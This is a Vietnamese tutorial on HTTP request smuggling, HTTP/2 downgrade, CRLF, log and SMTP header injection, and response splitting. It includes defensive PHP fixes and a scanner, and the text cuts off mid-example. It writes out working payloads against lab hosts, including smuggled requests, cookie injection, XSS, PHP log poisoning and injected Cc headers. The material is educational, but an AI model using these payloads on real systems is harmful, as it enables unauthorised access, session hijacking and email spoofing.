# 1. Further H2 Vulnerabilities

Trong phần này, chúng ta sẽ tìm hiểu về các lỗ hổng phức tạp hơn liên quan đến HTTP/2 (H2) và cách khai thác chúng để tạo ra tình huống **Request Smuggling** (lừa đảo yêu cầu). Đây là một kiểu tấn công cho phép kẻ tấn công gửi đi các yêu cầu độc hại đến một máy chủ thông qua proxy, nhằm lừa máy chủ xử lý sai yêu cầu.

### Kiến thức nền tảng

HTTP/2 là một giao thức nhị phân, có sự khác biệt rõ rệt so với HTTP/1.1 trong cách biểu diễn dữ liệu. Những khác biệt này dẫn đến cách xử lý các ký tự điều khiển khác nhau, đặc biệt là ký tự **CRLF** (`\r\n`). Trong HTTP/1.1, các ký tự này dùng để kết thúc một header, trong khi ở HTTP/2, chúng không có ý nghĩa đặc biệt. Điều này có thể dẫn đến việc **proxy đảo ngược** (reverse proxy) không xử lý đúng và gây ra lỗ hổng Request Smuggling.

#### H2.TE Vulnerability

Một lỗ hổng điển hình là **H2.TE**, xảy ra khi proxy không kiểm tra kỹ các header HTTP/2 trước khi chuyển đổi sang HTTP/1.1. Hãy xem xét một số ví dụ cụ thể:

### 1. Request Header Injection (Chèn giá trị header)

Nếu proxy không kiểm tra ký tự **CRLF** trong giá trị header HTTP/2, kẻ tấn công có thể chèn các yêu cầu độc hại thông qua một request HTTP/2 như sau:

#### Ví dụ:

**HTTP/2 Request:**
```
:method POST
:path /
:authority http2.htb
:scheme http
dummy asd\r\nTransfer-Encoding: chunked
0

GET /smuggled HTTP/1.1
Host: http2.htb
```

**Mô tả:**
- Kẻ tấn công tạo một header `dummy` với giá trị `asd\r\nTransfer-Encoding: chunked`.
- Ký tự `\r\n` không có ý nghĩa đặc biệt trong HTTP/2, nhưng khi proxy chuyển đổi sang HTTP/1.1, nó sẽ chia header thành hai phần.

**Khi được chuyển sang HTTP/1.1:**
```
POST / HTTP/1.1
Host: http2.htb
Dummy: asd
Transfer-Encoding: chunked
Content-Length: 48

0
GET /smuggled HTTP/1.1
Host: http2.htb
```

**Phân tích:**
- Proxy thêm header `Content-Length`, nhưng server ưu tiên `Transfer-Encoding: chunked`.
- Kết quả là request tiếp theo `GET /smuggled HTTP/1.1` bị xử lý một cách không mong muốn, gây ra lỗ hổng Request Smuggling.

### 2. Header Name Injection (Chèn tên header)

Một vấn đề tương tự xảy ra nếu proxy không kiểm tra tên header HTTP/2 một cách chính xác.

#### Ví dụ:

**HTTP/2 Request:**
```
:method POST
:path /
:authority http2.htb
:scheme http
dummy: asd\r\nTransfer-Encoding chunked
0

GET /smuggled HTTP/1.1
Host: http2.htb
```

**Khi được chuyển sang HTTP/1.1:**
```
POST / HTTP/1.1
Host: http2.htb
Dummy: asd
Transfer-Encoding: chunked
Content-Length: 48

0
GET /smuggled HTTP/1.1
Host: http2.htb
```

**Phân tích:**
- Header `Transfer-Encoding` được thêm vào từ tên header bị chèn (`dummy`).
- Lỗ hổng **H2.TE** xảy ra tương tự như ví dụ trước.

### 3. Request Line Injection (Chèn dòng yêu cầu)

Do các **pseudo-header** trong HTTP/2 có thể được xử lý khác nhau, nếu proxy không kiểm tra các pseudo-header này, có thể dẫn đến Request Smuggling.

#### Ví dụ:

**HTTP/2 Request:**
```
:method POST / HTTP/1.1\r\nTransfer-Encoding: chunked\r\nDummy: asd
:path /
:authority http2.htb
:scheme http
0

GET /smuggled HTTP/1.1
Host: http2.htb
```

**Khi được chuyển sang HTTP/1.1:**
```
POST / HTTP/1.1
Transfer-Encoding: chunked
Dummy: asd / HTTP/1.1
Host: http2.htb
Content-Length: 48

0
GET /smuggled HTTP/1.1
Host: http2.htb
```

**Phân tích:**
- Proxy xử lý pseudo-header `:method` sai, dẫn đến việc tạo ra một request độc hại.
- Request tiếp theo `GET /smuggled HTTP/1.1` bị xử lý ngoài ý muốn, gây ra Request Smuggling.

---
# 2. Các Cuộc Tấn Công HTTP trong Triển Khai Ứng Dụng Web Thực Tế

### Giới thiệu
Trong các ứng dụng web hiện đại, các hệ thống trung gian như **reverse proxy (proxy ngược)** thường được sử dụng để tăng hiệu suất và khả năng mở rộng. Tuy nhiên, những hệ thống này cũng có thể tạo ra những lỗ hổng bảo mật do cấu hình sai. Trong bài viết này, chúng ta sẽ tìm hiểu về ba lỗ hổng HTTP phổ biến: **CRLF Injection**, **HTTP Request Smuggling**, và **HTTP/2 Downgrade Attack**. Những lỗ hổng này lợi dụng sự khác biệt giữa các giao thức HTTP hoặc sự thiếu kiểm tra đầu vào.

Hiểu rõ các lỗ hổng này sẽ giúp bạn phát hiện, khai thác và phòng chống chúng hiệu quả. Hãy cùng đi vào chi tiết từng cuộc tấn công.

---

### 1. Tấn Công CRLF Injection

**CRLF Injection** khai thác việc xử lý không đúng các ký tự **Carriage Return (CR)** và **Line Feed (LF)** trong đầu vào người dùng. Các ký tự này (`\r\n`) được sử dụng để kết thúc một dòng trong tiêu đề HTTP và bắt đầu một dòng mới. Nếu một ứng dụng web không lọc các ký tự này, kẻ tấn công có thể chèn các tiêu đề giả mạo hoặc chỉnh sửa phản hồi HTTP.

#### Ví dụ:

Giả sử một ứng dụng web có URL sau:

```
https://example.com/search?q=keyword
```

Nếu đầu vào `q` không được lọc, kẻ tấn công có thể khai thác như sau:

```
https://example.com/search?q=keyword%0D%0ASet-Cookie:%20session=malicious
```

- `%0D%0A` là chuỗi ký tự CRLF.
- Tiêu đề được chèn vào (`Set-Cookie: session=malicious`) khiến server thiết lập cookie độc hại.

**Tác động**:
- Phân tách phản hồi HTTP
- Đầu độc bộ nhớ đệm (Cache Poisoning)
- Cross-Site Scripting (XSS)

**Phòng chống**:
- Kiểm tra và loại bỏ các ký tự CR (`\r`) và LF (`\n`) khỏi đầu vào người dùng.
- Sử dụng các framework web có cơ chế ngăn chặn tự động.

---

### 2. Tấn Công HTTP Request Smuggling (Desync Attacks)

**HTTP Request Smuggling** xảy ra khi có sự khác biệt trong cách một **reverse proxy** và **server backend** diễn giải yêu cầu HTTP. Điều này có thể gây ra hiện tượng **desynchronization (mất đồng bộ)**, cho phép kẻ tấn công vượt qua các biện pháp bảo vệ hoặc chiếm quyền điều khiển phiên của người dùng khác.

#### Ví dụ:

Trong HTTP/1.1, độ dài của phần thân yêu cầu có thể được xác định bằng tiêu đề `Content-Length` hoặc `Transfer-Encoding`.

Yêu cầu sau đây có thể gây ra tấn công:

```http
POST / HTTP/1.1
Host: vulnerable.com
Content-Length: 13
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
Host: vulnerable.com
```

- Proxy ngược sử dụng `Content-Length` (13 byte) và chuyển tiếp phần thân yêu cầu.
- Server backend sử dụng `Transfer-Encoding: chunked` và đọc yêu cầu tiếp theo (`GET /admin`).
- Điều này dẫn đến yêu cầu bị smuggled (bị giấu), cho phép truy cập trái phép.

**Tác động**:
- Truy cập trái phép
- Vượt qua các Web Application Firewall (WAF)
- Chiếm quyền phiên của người dùng

**Phòng chống**:
- Không cho phép sử dụng đồng thời cả `Content-Length` và `Transfer-Encoding` trong cùng một yêu cầu.
- Sử dụng phân tích cú pháp chặt chẽ cho các yêu cầu HTTP tại proxy ngược.

---

### 3. Tấn Công HTTP/2 Downgrade Attack

HTTP/2 mang lại nhiều cải tiến về hiệu suất và bảo mật, bao gồm cả các biện pháp ngăn chặn tấn công request smuggling. Tuy nhiên, do HTTP/2 chưa được hỗ trợ rộng rãi, nhiều hệ thống vẫn chuyển đổi yêu cầu HTTP/2 sang HTTP/1.1 khi giao tiếp với server backend. Việc **downgrade** (hạ cấp) này có thể dẫn đến lỗ hổng nếu proxy ngược không xử lý đúng các tiêu đề HTTP/2.

#### Ví dụ:

Kẻ tấn công gửi một yêu cầu HTTP/2 như sau:

```http
:method POST
:path /
:authority http2.vulnerable.com
:scheme https
dummy asd\r\nTransfer-Encoding: chunked

0
GET /smuggled HTTP/1.1
Host: http2.vulnerable.com
```

- Trong HTTP/2, chuỗi CRLF không có ý nghĩa đặc biệt trong giá trị tiêu đề.
- Proxy ngược chuyển đổi yêu cầu này thành HTTP/1.1:

```http
POST / HTTP/1.1
Host: http2.vulnerable.com
Dummy: asd
Transfer-Encoding: chunked

0
GET /smuggled HTTP/1.1
Host: http2.vulnerable.com
```

- Server backend diễn giải `Transfer-Encoding: chunked`, dẫn đến tấn công request smuggling.

**Tác động**:
- Khai thác các lỗ hổng của HTTP/1.1 ngay cả khi sử dụng HTTP/2 ở frontend.
- Vượt qua các biện pháp bảo mật và truy cập trái phép.

**Phòng chống**:
- Đảm bảo kiểm tra đúng các tiêu đề HTTP/2 trước khi downgrade sang HTTP/1.1.
- Tránh sử dụng phiên bản HTTP hỗn hợp trong cấu hình proxy ngược và server backend.

---
# 3. Tìm Hiểu về CRLF Injection

### 1. CRLF Injection là gì?

**CRLF Injection** là một lỗ hổng bảo mật lợi dụng việc không kiểm tra và lọc ký tự **Carriage Return (CR)** và **Line Feed (LF)** trong đầu vào của người dùng. Hai ký tự này đánh dấu sự kết thúc của một dòng và bắt đầu dòng mới. Khi một ứng dụng web không xử lý đúng các ký tự này, kẻ tấn công có thể chèn thêm dòng mới vào các vị trí nhạy cảm, gây ra những thay đổi không mong muốn trong luồng xử lý dữ liệu.

#### Ký tự CR và LF:
- **CR (Carriage Return)**:
  - Ký tự ASCII: `13` hoặc `0x0D` (hex).
  - Mã hóa URL: `%0D`.
  - Chức năng: Đưa con trỏ về đầu dòng.
- **LF (Line Feed)**:
  - Ký tự ASCII: `10` hoặc `0x0A` (hex).
  - Mã hóa URL: `%0A`.
  - Chức năng: Di chuyển con trỏ xuống dòng mới.

Khi kết hợp lại (`\r\n` hoặc `%0D%0A` trong URL), chúng tạo thành chuỗi **CRLF**, đánh dấu sự bắt đầu của một dòng mới trong các giao thức như **HTTP**, **SMTP**, hoặc khi ghi vào file log.

### 2. Các Ngữ Cảnh Dễ Bị Tấn Công CRLF Injection

CRLF Injection có thể xảy ra khi đầu vào từ người dùng không được lọc và được sử dụng trong các ngữ cảnh nhạy cảm, bao gồm:
- **Tiêu đề HTTP (HTTP Headers)**: Ví dụ như `Set-Cookie`, `Location`, hoặc `Content-Type`.
- **File Log**: Khi thông tin được ghi vào log mà không kiểm tra đầu vào.
- **Tiêu đề SMTP**: Dùng trong các email, có thể bị lợi dụng để thay đổi nội dung email hoặc giả mạo người gửi.

### 3. Tác Động của CRLF Injection

Mặc dù bản thân ký tự CR và LF không gây hại, nhưng chúng có thể thay đổi ý nghĩa của thông điệp và dẫn đến các cuộc tấn công phức tạp hơn. Dưới đây là một số kịch bản và tác động phổ biến:

#### a. **HTTP Header Injection**
- **Mô tả**: Nếu một ứng dụng phản hồi với dữ liệu từ người dùng mà không lọc các ký tự CRLF, kẻ tấn công có thể chèn các tiêu đề HTTP mới.
- **Ví dụ**:
  ```http
  GET /search?q=abc%0D%0ASet-Cookie:%20session=malicious HTTP/1.1
  Host: vulnerable.com
  ```
  - Yêu cầu trên sẽ chèn tiêu đề mới `Set-Cookie`, tạo ra cookie độc hại `session=malicious`.

- **Tác động**:
  - **XSS Phản Chiếu (Reflected XSS)**: Kẻ tấn công có thể chèn mã JavaScript vào phản hồi HTTP.
  - **Đầu độc bộ nhớ đệm (Cache Poisoning)**: Làm sai lệch dữ liệu được lưu trong bộ nhớ đệm, ảnh hưởng đến nhiều người dùng.

#### b. **Log Forgery (Giả Mạo File Log)**
- **Mô tả**: Nếu các ký tự CRLF được chèn vào file log, kẻ tấn công có thể tạo ra các bản ghi giả mạo.
- **Tác động**:
  - **Gây Nhiễu File Log**: Làm sai lệch thông tin, khiến quản trị viên khó xác định các sự kiện thực tế.
  - **Che Giấu Dấu Vết**: Kẻ tấn công có thể che giấu các hành động độc hại bằng cách chèn các bản ghi giả.

#### c. **SMTP Header Injection**
- **Mô tả**: Trong email, các tiêu đề như `From`, `Subject`, và `To` được phân tách bằng chuỗi CRLF. Nếu đầu vào từ người dùng không được kiểm tra, kẻ tấn công có thể chèn các tiêu đề SMTP mới.
- **Ví dụ**:
  ```
  From: victim@example.com%0D%0ASubject: You are hacked
  ```
  - Email có thể chứa các tiêu đề không mong muốn, dẫn đến việc giả mạo email.

- **Tác động**:
  - **Email Spoofing (Giả Mạo Email)**: Gửi email dưới dạng người dùng khác.
  - **Phishing**: Lừa đảo người dùng thông qua email giả mạo.

---
# 4. Tìm Hiểu về Log Injection

### 1. Log Injection là gì?

Trong các ứng dụng web, thông tin từ yêu cầu của người dùng thường được ghi lại trong **file log**. Những thông tin này bao gồm:
- Địa chỉ IP của người gửi yêu cầu.
- Đường dẫn yêu cầu.
- Các tham số của yêu cầu.

Mục đích chính của việc ghi log là giúp cho việc **gỡ lỗi** và **phân tích bảo mật** dễ dàng hơn khi có sự cố xảy ra. Một số ứng dụng còn tích hợp **Web Application Firewall (WAF)** để ghi lại các yêu cầu có dấu hiệu đáng ngờ, chẳng hạn khi chứa các ký tự đặc biệt nhằm khai thác lỗ hổng.

**Log Injection** là một loại tấn công xảy ra khi đầu vào từ người dùng không được lọc các ký tự đặc biệt như **Carriage Return (CR)** và **Line Feed (LF)** trước khi ghi vào file log. Điều này có thể cho phép kẻ tấn công:
- **Giả mạo bản ghi log** để tạo ra các dòng log không có thật.
- **Poison Log** để thực thi mã độc, có thể dẫn đến **Remote Code Execution (RCE)**.

### 2. Nhận diện Lỗ Hổng Log Injection

Hãy xem xét ví dụ dưới đây, một ứng dụng web đơn giản có form liên hệ (contact form). Form này cho phép người dùng gửi thông tin bao gồm tên, email, số điện thoại, và tin nhắn. Ứng dụng có ghi lại các yêu cầu đáng ngờ vào file log, tương tự như cách hoạt động của một WAF.

#### Ví dụ 1: Yêu cầu HTTP với Payload SQL Injection
```http
POST /contact.php HTTP/1.1
Host: loginjection.htb
Content-Length: 66
Content-Type: application/x-www-form-urlencoded

name=testuser&email=test%40htb.com&phone=123&message=test'+--+
```

Yêu cầu trên sẽ bị chặn bởi bộ lọc vì có chứa payload **SQL Injection** (`'--+`).

Ứng dụng này cũng có một endpoint là `/log.php` để hiển thị nội dung file log, giúp quản trị viên theo dõi các yêu cầu đáng ngờ. Tuy nhiên, nếu file log được lưu trong thư mục hiện tại và không được bảo vệ đúng cách, nó có thể truy cập công khai.

#### Kiểm Tra Lỗ Hổng Bằng Chuỗi CRLF
Chúng ta có thể kiểm tra lỗ hổng bằng cách chèn chuỗi ký tự CRLF (`%0d%0a`) vào tin nhắn:

```http
POST /contact.php HTTP/1.1
Host: loginjection.htb
Content-Length: 73
Content-Type: application/x-www-form-urlencoded

name=testuser&email=test%40htb.com&phone=123&message=test1'%0d%0atest2
```

Khi yêu cầu này được ghi vào file log, nó sẽ tạo ra một dòng mới, chứng tỏ rằng chuỗi CRLF không được lọc. Điều này có nghĩa là chúng ta đã thành công chèn một dòng mới vào file log.

### 3. Khai Thác Lỗ Hổng Log Injection

#### a. **Giả Mạo File Log (Log Forgery)**
Với một lỗ hổng Log Injection đơn giản, kẻ tấn công có thể giả mạo bản ghi log, khiến cho quản trị viên nhầm lẫn về hành động của người dùng.

**Ví dụ**:
```http
POST /contact.php HTTP/1.1
Host: 172.17.0.2
Content-Length: 124
Content-Type: application/x-www-form-urlencoded

name=testuser&email=testuser%40test.htb&phone=123&message=test1';%0a%0dMalicious+message+from+admin+(127.0.0.1):+'+OR1=1+--+
```

Khi yêu cầu này được ghi vào file log, sẽ có thêm một dòng giả mạo:
```
Malicious message from admin (127.0.0.1): ' OR 1=1 --
```

Kết quả là file log đã bị thay đổi, khiến cho quản trị viên không thể phân biệt được bản ghi nào là thật và bản ghi nào là giả mạo.

#### b. **Log Poisoning để Thực Thi Mã (RCE)**
Trong một số trường hợp, nếu ứng dụng ghi trực tiếp đầu vào của người dùng vào file log mà không lọc các ký tự đặc biệt, kẻ tấn công có thể chèn mã PHP vào log file. Điều này có thể dẫn đến **Remote Code Execution (RCE)** nếu ứng dụng có lỗ hổng **Local File Inclusion (LFI)**.

**Ví dụ**:
```http
POST /contact.php HTTP/1.1
Host: 172.17.0.2
Content-Length: 80
Content-Type: application/x-www-form-urlencoded

name=testuser&email=testuser%40test.htb&phone=123&message=<?php+echo+'pwned';+?>
```

Nếu log file này sau đó được truy cập qua LFI, mã PHP sẽ được thực thi, in ra chuỗi `"pwned"`.

**Lưu ý**: Trong thực tế, các bộ lọc thường được triển khai để ngăn chặn mã độc. Kẻ tấn công có thể cần sử dụng các kỹ thuật **bypass** để vượt qua bộ lọc.

---
# 5. Tìm Hiểu về HTTP Response Splitting

### 1. HTTP Response Splitting là gì?

**HTTP Response Splitting** là một lỗ hổng bảo mật nghiêm trọng xảy ra khi một ứng dụng web phản hồi lại dữ liệu từ người dùng trong **HTTP headers** mà không thực hiện lọc đúng cách. Bằng cách chèn chuỗi ký tự đặc biệt **CRLF** (`%0d%0a`), kẻ tấn công có thể phá vỡ cấu trúc của HTTP header và chèn thêm các header tuỳ ý hoặc thậm chí thay đổi toàn bộ nội dung phản hồi. Điều này có thể dẫn đến:
- **XSS phản chiếu** (Reflected XSS).
- **Web cache poisoning**.
- Bỏ qua các cơ chế bảo mật như **Content-Security-Policy (CSP)** hoặc **Clickjacking protection**.

### 2. Nhận diện Lỗ Hổng HTTP Response Splitting

Giả sử chúng ta có một ứng dụng web đơn giản cho phép người dùng cung cấp một URL đích để chuyển hướng. Ứng dụng sẽ sử dụng header `Refresh` để điều hướng người dùng đến URL được cung cấp sau 2 giây.

Ví dụ yêu cầu HTTP:
```http
GET /?target=http://hackthebox.com HTTP/1.1
Host: responsesplitting.htb
```

Khi gửi yêu cầu này, server sẽ phản hồi với header:
```http
HTTP/1.1 200 OK
Content-Type: text/html; charset=UTF-8
Refresh: 2; URL=http://hackthebox.com
```

Nếu ứng dụng không lọc đúng cách chuỗi CRLF (`%0d%0a`), kẻ tấn công có thể chèn thêm header tùy ý.

#### Ví dụ kiểm tra lỗ hổng bằng CRLF
Yêu cầu HTTP:
```http
GET /?target=http%3A%2F%2Fhackthebox.com%0d%0aTest:%20test HTTP/1.1
Host: responsesplitting.htb
```

Phản hồi từ server:
```http
HTTP/1.1 200 OK
Content-Type: text/html; charset=UTF-8
Refresh: 2; URL=http://hackthebox.com
Test: test
```

Trong phản hồi trên, có thể thấy header `Test: test` đã được chèn vào, chứng minh rằng lỗ hổng **HTTP Response Splitting** tồn tại.

### 3. Khai Thác Lỗ Hổng HTTP Response Splitting

#### a. **Reflected XSS với Payload HTML**
Chúng ta có thể tận dụng lỗ hổng này để thực hiện tấn công **Reflected XSS**. Để khai thác, kẻ tấn công cần chèn hai chuỗi CRLF (`%0d%0a%0d%0a`) để kết thúc phần header và bắt đầu phần body của phản hồi.

**Ví dụ yêu cầu HTTP**:
```http
GET /?target=http%3A%2F%2Fhackthebox.com%0d%0a%0d%0a<html><script>alert(1)</script></html> HTTP/1.1
Host: responsesplitting.htb
```

Phản hồi từ server:
```http
HTTP/1.1 200 OK
Content-Type: text/html; charset=UTF-8

<html><script>alert(1)</script></html>
```

Khi trình duyệt nhận được phản hồi này, mã JavaScript sẽ được thực thi và hiển thị thông báo `alert(1)`, chứng minh rằng tấn công XSS đã thành công.

#### b. **Khai thác HTTP 302 Redirect**
Trong nhiều trường hợp, ứng dụng web sử dụng header `Location` để điều hướng người dùng với mã trạng thái HTTP 302. Khi đó, trình duyệt sẽ tự động chuyển hướng mà không hiển thị nội dung phản hồi, do đó payload XSS sẽ không được thực thi.

**Ví dụ yêu cầu HTTP không thành công**:
```http
GET /?target=http%3A%2F%2Fhackthebox.com%0d%0a%0d%0a<html><script>alert(1)</script></html> HTTP/1.1
Host: responsesplitting.htb
```

Trình duyệt sẽ chuyển hướng mà không thực thi mã JavaScript. Tuy nhiên, kẻ tấn công có thể vượt qua điều này bằng cách cung cấp một header `Location` rỗng.

**Ví dụ khai thác với header `Location` rỗng**:
```http
GET /?target=%0d%0a%0d%0a<html><script>alert(1)</script></html> HTTP/1.1
Host: responsesplitting.htb
```

Phản hồi từ server:
```http
HTTP/1.1 302 Found
Location: 

<html><script>alert(1)</script></html>
```

Trình duyệt không biết phải chuyển hướng đến đâu, nên hiển thị nội dung phản hồi và thực thi mã XSS.

### 4. Khả năng Tấn công Khác
HTTP Response Splitting không chỉ được sử dụng để thực hiện tấn công XSS mà còn có thể khai thác theo nhiều cách khác, bao gồm:

- **Web Cache Poisoning**: Kẻ tấn công có thể chèn các header độc hại vào phản hồi để làm nhiễm độc bộ nhớ đệm của web server, khiến tất cả người dùng truy cập sau đó nhận được nội dung độc hại.
- **Bỏ Qua Các Cơ Chế Bảo Mật**: Kẻ tấn công có thể chèn các header tuỳ ý như:
  - Xoá bỏ header bảo vệ **Content-Security-Policy (CSP)**.
  - Vô hiệu hoá header bảo vệ **Clickjacking**.

---
# 6. SMTP Header Injection

SMTP Header Injection (còn gọi là Email Injection) là một lỗ hổng bảo mật cho phép kẻ tấn công tiêm vào các header SMTP thông qua đầu vào người dùng. SMTP (**Simple Mail Transfer Protocol**) là giao thức được sử dụng để gửi email. Các header của SMTP được ngăn cách bởi ký tự xuống dòng (CRLF). Khi dữ liệu người dùng không được lọc đúng cách, kẻ tấn công có thể lợi dụng điều này để thực hiện tấn công CRLF Injection nhằm chèn các header SMTP tùy ý.

### 1. **Cấu trúc của SMTP Headers**

Một email SMTP điển hình gồm hai phần chính:
- **Header**: Chứa thông tin như người gửi, người nhận, tiêu đề, v.v.
- **Body**: Nội dung chính của email.

Ví dụ về một email SMTP đơn giản:

```
From: [email protected]
To: [email protected]
Cc: [email protected]
Subject: Testmail

Đây là nội dung của email.
.
```

Các header quan trọng trong SMTP bao gồm:
- `From`: Địa chỉ người gửi.
- `To`: Địa chỉ người nhận.
- `Cc`: Carbon copy, gửi bản sao đến một người nhận khác.
- `Bcc`: Blind carbon copy, gửi bản sao nhưng không hiển thị người nhận khác.
- `Subject`: Tiêu đề email.

### 2. **Phát hiện lỗ hổng SMTP Header Injection**

Khi một ứng dụng web có chức năng gửi email và cho phép người dùng nhập thông tin vào các trường như địa chỉ email, tên, hoặc tiêu đề, chúng ta cần kiểm tra xem dữ liệu người dùng có được lọc đúng cách hay không.

Ví dụ về yêu cầu HTTP kiểm tra lỗ hổng:

```http
POST /contact.php HTTP/1.1
Host: smtpinjection.htb
Content-Length: 105
Content-Type: application/x-www-form-urlencoded

name=evilhacker&[email protected]%0d%0aTestheader:%20Testvalue&phone=123456789&message=Hello+Admin%21
```

Trong ví dụ trên:
- `%0d%0a` là chuỗi CRLF (Carriage Return và Line Feed).
- Chúng ta đã chèn một header tùy ý (`Testheader: Testvalue`) vào email.

Nếu yêu cầu này được phản hồi và header `Testheader: Testvalue` được thêm vào email, ứng dụng có lỗ hổng SMTP Header Injection.

### 3. **Khai thác SMTP Header Injection**

#### **3.1. Thêm người nhận vào email**

Khi không thể xem được email kết quả, kẻ tấn công có thể thử thêm email của mình vào danh sách người nhận để kiểm tra:

```http
POST /contact.php HTTP/1.1
Host: smtpinjection.htb
Content-Length: 107
Content-Type: application/x-www-form-urlencoded

name=evilhacker&[email protected]%0d%0aCc:%[email protected]&phone=123456789&message=Hello+Admin%21
```

Nếu email được gửi đến `[email protected]`, thì lỗ hổng đã được xác nhận. Điều này có thể dẫn đến:
- **Đánh cắp thông tin nhạy cảm**: Kẻ tấn công nhận được nội dung email gốc.
- **Gửi spam**: Kẻ tấn công có thể chèn một danh sách email lớn vào trường `To`, `Cc`, hoặc `Bcc`.

#### **3.2. Chèn thêm header tùy ý**

Nếu ứng dụng thêm dữ liệu vào sau đầu vào của người dùng (ví dụ: thêm dấu chấm than `!`), kẻ tấn công cần phải chèn một header giả sau payload chính để tránh việc payload bị phá vỡ:

```http
POST /contact.php HTTP/1.1
Host: smtpinjection.htb
Content-Length: 151
Content-Type: application/x-www-form-urlencoded

name=evilhacker&email=evil%40attacker.htb%0d%0aCc:%[email protected]%0d%0aDummyheader:%20abc&phone=123456789&message=Hello+Admin%21
```

Payload trên sẽ đảm bảo header `Cc` được chèn đúng cách, tránh trường hợp payload bị hỏng bởi ký tự bổ sung.

---
# 7. Phòng chống lỗ hổng CRLF Injection

Việc phòng chống các lỗ hổng **CRLF Injection** là vô cùng quan trọng để đảm bảo an toàn cho hệ thống. Sau đây là một số phương pháp phòng chống mà bạn có thể áp dụng:

### 1. Cấu hình bảo mật an toàn

Lỗ hổng **CRLF Injection** có thể xảy ra ở bất kỳ vị trí nào mà chuỗi ký tự **CRLF** (`\r\n`) có ý nghĩa đặc biệt, như:
- Ghi log (Log files)
- Header trong HTTP hoặc SMTP

### 2. Ngăn chặn **Log Injection**

Ví dụ dưới đây minh họa một lỗ hổng **Log Injection**:

```php
function log_msg($ip, $user_agent, $msg) {
    global $LOGFILE;
    $log_msg = "Request from " . $ip . " (" . $user_agent . "): " . $msg;
    file_put_contents($LOGFILE, $log_msg, FILE_APPEND | LOCK_EX);
}
log_msg($_SERVER['REMOTE_ADDR'], $_SERVER['HTTP_USER_AGENT'], $_POST['msg']);
```

#### Ngăn chặn:
- **Sử dụng chức năng ghi log có sẵn của web server**.
- **Mã hóa URL** cho các tham số đầu vào từ người dùng trước khi ghi vào file log:

```php
function log_msg($ip, $user_agent, $msg) {
    global $LOGFILE;
    $log_msg = "Request from " . urlencode($ip) . " (" . urlencode($user_agent) . "): " . urlencode($msg);
    file_put_contents($LOGFILE, $log_msg, FILE_APPEND | LOCK_EX);
}
```

### 3. Phòng chống **HTTP Response Splitting**

Trước đây, trong PHP, việc sử dụng hàm `header()` có thể gây ra lỗ hổng **HTTP Response Splitting**:

```php
header("Location: " . $_GET['url']);
```

#### Cách khắc phục:
- **Không chèn trực tiếp dữ liệu người dùng vào header**.
- **Mã hóa URL** các tham số đầu vào:

```php
header("Location: " . urlencode($_GET['url']));
```

- Sử dụng PHP từ phiên bản 5.1.2 trở lên, vì lỗi này đã được khắc phục trong các phiên bản mới.

### 4. Ngăn chặn **SMTP Header Injection**

SMTP Header Injection là một biến thể của CRLF Injection, thường xảy ra khi sử dụng các hàm gửi email mặc định trong PHP:

```php
$to = "admin@example.com";
$subject = "You received a message";
$message = "Here is the message:\r\n" . $_POST['message'];
$user_mail = $_POST['email'];
$headers = "From: " . $user_mail . "\r\n";
$headers .= "Reply-To: reply@example.com\r\n";
mail($to, $subject, $message, $headers);
```

#### Cách khắc phục:
- **Không sử dụng trực tiếp dữ liệu người dùng trong header**.
- **Mã hóa URL** cho dữ liệu đầu vào:

```php
$to = "admin@example.com";
$subject = "You received a message";
$message = "Here is the message:\r\n" . $_POST['message'];
$user_mail = $_POST['email'];
$headers = "From: " . urlencode($user_mail) . "\r\n";
$headers .= "Reply-To: reply@example.com\r\n";
mail($to, $subject, $message, $headers);
```

### 5. Sử dụng công cụ kiểm tra lỗ hổng **CRLF Injection**

Một công cụ hữu ích để phát hiện lỗ hổng **CRLF Injection** là **CRLFsuite**. Bạn có thể cài đặt công cụ này bằng lệnh sau:

```bash
pip3 install crlfsuite
```

#### Sử dụng:

```bash
crlfsuite -t http://example.com/?param=value
```

Các tùy chọn phổ biến:

- `-t`: Chỉ định URL mục tiêu.
- `-m`: Chỉ định phương thức HTTP (`GET` hoặc `POST`).
- `-c`: Thêm cookie nếu cần thiết.
- `-v`: Mức độ chi tiết khi quét (`1`, `2`, `3`).
- `-sL`: Chế độ im lặng (Silent mode).

#### Ví dụ:

```bash
crlfsuite -t http://127.0.0.1:8000/?target=asd
```

Kết quả sẽ hiển thị các điểm có thể khai thác:

```plaintext
[VLN] http://127.0.0.1:8000/?target=%0d%0aLocation:%0d%0aContent-Type:text/html%0d%0a%0d%0a<script>alert('XSS')</script>
```

---
# 8. Giới thiệu về HTTP Request Smuggling

HTTP Request Smuggling, còn được gọi là **Desync Attacks**, là một kỹ thuật tấn công nâng cao khai thác sự khác biệt trong việc phân tích các yêu cầu HTTP giữa **frontend** (thường là reverse proxy, web cache, hoặc WAF) và **backend** (thường là web server). Kỹ thuật này yêu cầu hiểu rõ về giao thức TCP và HTTP để nhận diện được vấn đề xảy ra.

#### Dòng TCP chứa các yêu cầu HTTP

**TCP (Transmission Control Protocol)** là giao thức tầng vận chuyển cung cấp truyền thông tin đáng tin cậy và theo thứ tự. Giao thức TCP là **stream-oriented**, tức là dữ liệu được truyền dưới dạng luồng mà không có dấu phân cách rõ ràng giữa các yêu cầu HTTP.

Từ HTTP/1.1, các yêu cầu HTTP không còn được gửi qua từng kết nối TCP riêng lẻ mà sử dụng chung một kết nối TCP, điều này giúp cải thiện hiệu suất. Trong các trường hợp có reverse proxy, kết nối TCP thường được giữ mở và tái sử dụng cho nhiều yêu cầu:

```plaintext
POST / HTTP/1.1
Host: clte.htb
Content-Length: 5

HELLO
GET / HTTP/1.1
Host: clte.htb
```

Ở ví dụ trên, yêu cầu **POST** có phần thân là `HELLO` và yêu cầu **GET** bắt đầu ngay sau đó mà không có dấu phân cách rõ ràng. Vì thế, cả reverse proxy và web server đều cần xác định đúng điểm kết thúc yêu cầu trước và bắt đầu yêu cầu tiếp theo.

### Content-Length vs Transfer-Encoding

Có hai header HTTP chính được sử dụng để xác định độ dài phần thân yêu cầu HTTP:

1. **Content-Length (CL)**: Xác định rõ ràng độ dài (tính bằng byte) của phần thân yêu cầu.
2. **Transfer-Encoding (TE)**: Sử dụng phương pháp mã hóa `chunked`, chia phần thân thành các đoạn nhỏ với kích thước xác định.

#### Ví dụ sử dụng `Content-Length`:

```http
POST / HTTP/1.1
Host: 127.0.0.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 29

param1=HelloWorld&param2=Test
```

Ở đây, header `Content-Length` chỉ ra phần thân có độ dài 29 byte.

#### Ví dụ sử dụng `Transfer-Encoding: chunked`:

```http
POST / HTTP/1.1
Host: 127.0.0.1
Content-Type: application/x-www-form-urlencoded
